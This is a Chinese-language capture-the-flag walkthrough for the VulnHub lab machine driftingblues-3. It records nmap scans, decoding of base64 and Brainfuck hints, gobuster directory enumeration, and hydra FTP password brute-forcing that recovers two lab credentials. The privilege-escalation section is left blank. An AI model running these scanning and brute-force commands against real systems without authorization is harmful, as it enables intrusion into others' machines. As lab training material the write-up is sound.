# 目标

get **flags**

---

# 1.信息收集
## 1.1 主机发现
```shell
nmap -sn --max-rate 10000 192.168.64.0/24
```
![](./img/1.png)
靶机的IP地址是：`192.168.64.29`

## 1.2 端口扫描
**TCP SYN扫描**
```shell
nmap -sS -sV -p- --max-rate 10000 192.168.64.29 -oA nmap-scan/syn
```
![](./img/2.png)

**TCP Connect()扫描**
```shell
nmap -sT -sV -p- --max-rate 10000 192.168.64.29 -oA nmap-scan/tcp
```
![](./img/3.png)

**UDP扫描**
```shell
nmap -sU -sV --top-ports 100 --max-rate 10000 192.168.64.29 -oA nmap-scan/udp
```
![](./img/4.png)

**使用nmap的内置默认脚本扫描端口**
```shell
nmap -sV -sC -O -p 21,22,80,2 192.168.64.29 -oA nmap-scan/default
```
![](./img/5.png)

**使用nmap内置的漏洞脚本扫描端口**
```shell
nmap -sV --script vuln -p 21,22,80,2 192.168.64.29 -oA nmap-scan/vuln
```
有很多信息。

## 1.3 80端口信息收集
**访问`http://192.168.64.29`**
![](./img/6.png)
没什么信息，查看一下源码，可以得到如下信息，
![](./img/7.png)
不知道是啥编码，试试base64,
```
Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09
⬇️
go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==
⬇️
go back intruder!!! tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=
⬇️
go back intruder!!! tight security drippin i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=
⬇️
go back intruder!!! tight security drippin i hope you're an employee /imfuckingmad.txt
```

**访问`http://192.168.64.29/imfuckingmad.txt`**
访问得到到的是Brainfuck的代码，保存到*brainfuck.txt*文件，下面进行解码，
```python
from brainfuckery import Brainfuckery
with open('brainfuck.txt', 'r', encoding='utf-8') as f:
    code = f.read()
result = Brainfuckery().interpret(code)
print(result)
```
输出如下：
```
man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! 
## (中间全是这个)
/iTiS3Cr3TbiTCh.png
```

**访问`http://192.168.64.29/iTiS3Cr3TbiTCh.png`**
扫出来的一个二维码，安装zbar-tools工具，解读一下，
```shell
wget http://192.168.64.29/iTiS3Cr3TbiTCh.png
zbarimg iTiS3Cr3TbiTCh.png
```
又是另一个网站的一张图片，`https://i.imgur.com/a4JjS76.png`
![](./img/8.png)
上面提供了一些似乎是人名的单词。

**扫描网站目录/文件**
```shell
gobuster dir --url http://192.168.64.29 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip,txt,php,git,bak,html -db
```
![](./img/10.png)

## 1.4 22端口信息收集
```shell
nmap -sV -p 22 --script ssh-auth-methods.nse,ssh-hostkey.nse 192.168.64.29
```
![](./img/9.png)
ssh只允许密钥登陆。

## 1.5 21端口信息收集
```shell
nmap -sV -p 21 --script ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-syst.nse 192.168.64.29
```
![](./img/11.png)
没什么漏洞。

---

# 2.拿到系统立足点

**使用上面得到的类似人名的单词来暴力破解ftp**
```shell
hydra -l luther -P /usr/share/wordlists/rockyou.txt ftp://192.168.64.29 -t 32 -V -f
hydra -l gary -P /usr/share/wordlists/rockyou.txt ftp://192.168.64.29 -t 32 -V -f
hydra -l hubert -P /usr/share/wordlists/rockyou.txt ftp://192.168.64.29 -t 32 -V -f
hydra -l clark -P /usr/share/wordlists/rockyou.txt ftp://192.168.64.29 -t 32 -V -f
```
可以从上面破解出，
- login: `luther`   password: `mypics`
- login: `hubert`   password: `john316`






---

# 系统提权






---
---

# 硬件与软件平台
## 硬件
- Apple Macbook pro M1-Pro `32G 512G`
- `macOS 14.8.5`
- `UTM虚拟机平台`

## 软件
kali
- IP: `192.168.64.2`
- OS Realease: `debian 2025.4`
- `Arm64`

靶机driftingblues-3: 
- `https://www.vulnhub.com/entry/driftingblues-3,656/`

---

> 水平有限，有不足、错误之处欢迎指出。🧐